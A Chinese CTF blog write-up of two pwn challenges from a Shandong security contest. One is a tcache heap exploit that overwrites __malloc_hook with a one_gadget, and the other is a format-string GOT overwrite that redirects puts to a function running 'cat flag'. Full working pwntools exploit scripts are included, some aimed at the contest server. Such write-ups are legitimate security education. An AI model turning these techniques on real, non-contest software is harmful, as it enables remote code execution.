---
title: '山东省安全竞赛pwn题'
date: 2018-11-11 22:57:56
tags: 题目
---
<h1><strong>0x00 堆溢出:bb_tcache</strong></h1>
山大的题目 第一次接触堆的题目 以前只是看过堆溢出unlink相关的知识
山大题目连接http://47.105.148.65:4000/login?next=%2Fchallenges
先简短解释下这道题堆题用到的知识malloc_hook堆钩

```
malloc_hook是在调用malloc函数之前检查的地方，正常情况下该地址下的值为0，如果该内存不为0，则会在malloc前先执行malloc_hook中的地址的内容 也就是说如果我们在这块内存写入one_gadget，就会在malloc前执行one_gadget。
```
每次调用堆的申请 释放等函数时候实际会先执行malloc_hook去鉴别 如果malloc_hook内存值不是0 就会执行malloc_hook中存放地址的内容
![](https://i.loli.net/2018/11/11/5be84596ab863.png)
就是很正规的申请,释放和修改 看一下开了什么保护
![](https://i.loli.net/2018/11/11/5be845e37d9e3.png)
保护全开 只能通过leak地址 拖入IDA 静态调试一下
![](https://i.loli.net/2018/11/11/5be8461b930a2.png)
申请两字节 写入一字节 该elf文件是64位 刚好是写入一个地址的大小 下面开始exp的构造
<h1><strong>0x01 exp</strong></h1>
先ldd一下看一下 该文件用的libc库

```bash
$ ldd bb_tcache
	linux-vdso.so.1 (0x00007ffeadfc1000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f654e38c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f654e77d000)
```
用的就是``/lib/x86_64-linux-gnu/libc.so.6``
再去找一下这个libc的one_gadget
```bash
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

```
使用需要满足条件 可以一个一个试试 也可以去找当时的寄存器查条件 这里吧详细说明 我们选择使用最后一个``0x10a38c	execve("/bin/sh", rsp+0x70, environ)``

![](https://i.loli.net/2018/11/11/5be84722e4a15.png)
先把system地址得到 为了后面malloc_hook地址做准备
```python
#!/usr/bin/python 
from pwn import *
sh = process('./bb_tcache')
elf = ELF('./bb_tcache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
sh.recvuntil('I think you might need this: ')
one_gadget = 0x10a38c
system =int(sh.recvuntil('Give',drop=True),16)
print system
```
drop=True是为了不接受到Give 算是个recv的新知识
下面leak一下malloc_hook的地址
```python
libcbase = system - libc.symbols['system']
print str(int(libcbase))
malloc_hook = libcbase + libc.symbols['__malloc_hook']
print malloc_hook
```
得到地址后就通过修改堆fd指针 通过申请释放修改 再经过2次申请就就可以(不懂得看我前面uaf漏洞介绍) 
```python
sh.sendlineafter('4. quit!\n','1')
sh.sendlineafter('4. quit!\n','2')
sh.sendlineafter('4. quit!\n','3')
sh.sendafter('You might need this to tamper something.\n',p64(malloc_hook))
sh.sendlineafter('4. quit!','1')
sh.sendlineafter('4. quit!','1')
```
第二次申请得到得就是malloc_hook地址 我们需要把one_gadget写入malloc_hook地址内 然后再去执行一次malloc函数 就会因为malloc_hook内地址不为0去执行malloc_hook地址内的内容
```python
sh.sendlineafter('4. quit!','3')
sh.sendafter('You might need this to tamper something.\n',p64(libcbase+one_gadget))
sh.sendlineafter('4. quit!','1')
sh.interactive()
```
完整的exp
```python
#!/usr/bin/python 
from pwn import *
sh = process('./bb_tcache')
elf = ELF('./bb_tcache')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
sh.recvuntil('I think you might need this: ')
one_gadget = 0x10a38c
system =int(sh.recvuntil('Give',drop=True),16)
print system
libcbase = system - libc.symbols['system']
print str(int(libcbase))
malloc_hook = libcbase + libc.symbols['__malloc_hook']
print malloc_hook
sh.sendlineafter('4. quit!\n','1')
sh.sendlineafter('4. quit!\n','2')
sh.sendlineafter('4. quit!\n','3')
sh.sendafter('You might need this to tamper something.\n',p64(malloc_hook))
sh.sendlineafter('4. quit!','1')
sh.sendlineafter('4. quit!','1')
sh.sendlineafter('4. quit!','3')
sh.sendafter('You might need this to tamper something.\n',p64(libcbase+one_gadget))
sh.sendlineafter('4. quit!','1')
sh.interactive()
```

<h1><strong>0x02 格式化字符串:repeater</strong></h1>
一道格式化字符串的题 可以先去看一下我前面文件讲解的格式化字符串
先看一下文件的保护

![](https://i.loli.net/2018/11/12/5be90dc0b1804.png)
开了NX 堆栈不可执行 我们再托人IDA看看
![](https://i.loli.net/2018/11/12/5be90e12ee3a1.png)
很明显看到了格式化字符串漏洞的地方 并且后面还调用了puts函数(可以想到got表覆写)
![](https://i.loli.net/2018/11/12/5be90e7c40a61.png)
还有一个getflag函数 里面可以使用命令cmd 去看一下cmd是什么命令
![](https://i.loli.net/2018/11/12/5be90ebc43b7e.png)
刚好是``cat flag`` 所有可以通过格式化字符串漏洞把 got表中Puts函数地址写为getflag函数就可以 先看一下getflag命令的地址是什么
```bash
.text:080485D5                 sub     esp, 0Ch
.text:080485D8                 lea     eax, (cmd - 804A000h)[ebx] ; "/bin/cat flag"
.text:080485DE                 push    eax             ; command
.text:080485DF                 call    _system
```
可以看到从080485d5开始了system的操作 去看了一下got表中puts的位置
```
got.plt:0804A014 off_804A014     dd offset puts          ; DATA XREF: _puts
```
发现前前2字节是一样的 只需要去覆盖低字节的2个就可以
85d5转10进制是34261 下面开始构造exp
<h1><strong>0x03 exp</strong></h1>

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *
puts_got=0x0804a014
get_Flag=0x080485d5
client=remote('47.105.148.65',9999)
#client=process('./repeater')
#.%34261x%7$n1234
client.sendlineafter('your msg:','%34261x%7$hn'+p32(puts_got))
#gdb.attach(client)
client.interactive()
```
<h2>2018.11.15更新</h2>
repeater发现自己做法并不是最正确的 官方给出的题解用了fmtstr_paylaod函数
也是第一次见第一次使用 一个三个参数一个偏移位置 一个要写入的地址 一个写入地址的指 下面直接看exp

```python
from pwn import *
#puts_got=0x0804a014
#get_Flag=0x080485d5
client=remote('47.105.148.65',9999)
#client=process('./repeater')

payload = ''
payload = fmtstr_payload(4,{0x0804A064:0x3}) 
#先把控制循环次数变量改为3次 以防止无限循环
print payload
client.sendlineafter('your msg:',payload)
payload = ''
payload = fmtstr_payload(4,{0x0804A060:0x2018})
#把number变量赋值为0x2018 可以进入getflag函数里
print payload
client.sendline(payload)
payload = ''
payload = fmtstr_payload(4,{0x0804a014:0x080485B6})
#修改puts的got表为getflag地址
print payload
client.sendline(payload)

client.interactive()
#client.recv()
```